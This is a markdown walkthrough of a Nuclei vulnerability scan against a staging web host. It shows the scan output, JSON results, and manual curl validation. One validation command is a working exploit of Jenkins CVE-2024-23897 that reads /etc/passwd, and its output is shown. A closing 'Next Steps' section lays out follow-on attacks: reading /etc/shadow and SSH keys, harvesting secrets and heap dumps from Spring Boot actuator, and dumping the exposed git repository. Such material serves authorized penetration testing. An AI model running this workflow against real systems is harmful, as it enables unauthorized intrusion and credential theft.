# Nuclei Web Scan Example

## Command
```bash
$ nuclei -u https://staging.megacorp.com -severity critical,high,medium -rate-limit 50 -jsonl -o nuclei_results.json
```

## Output
```
                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.1.4

[INF] Current nuclei version: v3.1.4 (latest)
[INF] Current nuclei-templates version: v9.7.4 (latest)
[INF] Templates loaded: 8247 (critical: 412, high: 1834, medium: 3201)
[INF] Targets loaded: 1
[INF] Running httpx probe on input hosts (1 targets)

[2025-01-15 14:30:22] [CVE-2024-23897] [http] [critical] https://staging.megacorp.com:8080/
[2025-01-15 14:30:28] [CVE-2023-44487] [http] [high] https://staging.megacorp.com/
[2025-01-15 14:30:35] [git-config] [http] [medium] https://staging.megacorp.com/.git/config
[2025-01-15 14:30:41] [exposed-svn] [http] [medium] https://staging.megacorp.com/.svn/entries
[2025-01-15 14:31:02] [springboot-actuator] [http] [high] https://staging.megacorp.com/actuator
[2025-01-15 14:31:15] [open-redirect] [http] [medium] https://staging.megacorp.com/redirect?url=https://evil.com
[2025-01-15 14:31:22] [x-frame-options-missing] [http] [medium] https://staging.megacorp.com/

[INF] Scan completed in 62.3s | 8247 templates | 1 hosts | 7 findings
```

## JSON Output (nuclei_results.json)
```json
{"template":"CVE-2024-23897","severity":"critical","host":"https://staging.megacorp.com:8080/","matched-at":"https://staging.megacorp.com:8080/","type":"http","timestamp":"2025-01-15T14:30:22-05:00","curl-command":"curl -X POST 'https://staging.megacorp.com:8080/cli?remoting=false' -d 'cmd=help @/etc/passwd'"}
{"template":"springboot-actuator","severity":"high","host":"https://staging.megacorp.com/actuator","type":"http","timestamp":"2025-01-15T14:31:02-05:00"}
{"template":"git-config","severity":"medium","host":"https://staging.megacorp.com/.git/config","type":"http","timestamp":"2025-01-15T14:30:35-05:00"}
```

## Manual Validation
```bash
# Validate .git exposure
$ curl -s https://staging.megacorp.com/.git/HEAD
ref: refs/heads/main

# Validate Spring Boot Actuator
$ curl -s https://staging.megacorp.com/actuator | jq '.["_links"] | keys'
["beans", "env", "health", "heapdump", "info", "mappings", "metrics"]

# Validate Jenkins CVE-2024-23897 (arbitrary file read)
$ curl -s -X POST 'https://staging.megacorp.com:8080/cli?remoting=false' \
  -d 'cmd=help @/etc/passwd' | head -5
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

## Severity Assessment
| Finding | Severity | Validated | Impact |
|---------|----------|-----------|--------|
| CVE-2024-23897 (Jenkins) | **CRITICAL** | ✅ Yes | Arbitrary file read → credential theft → RCE |
| Spring Boot Actuator | **HIGH** | ✅ Yes | Environment variables (may contain secrets), heap dump |
| .git config exposed | **MEDIUM** | ✅ Yes | Source code disclosure, credentials in commits |
| .svn entries exposed | **MEDIUM** | ⚠️ Partial | Path disclosure, possible source leak |
| Open redirect | **MEDIUM** | ✅ Yes | Phishing pivot, token theft |

## Next Steps
→ **exploitation skill**: Jenkins CVE-2024-23897 → read /etc/shadow, SSH keys
→ **collection skill**: Spring Boot /actuator/env for secrets, /actuator/heapdump for creds
→ **reconnaissance skill**: `git-dumper` to extract full .git repository
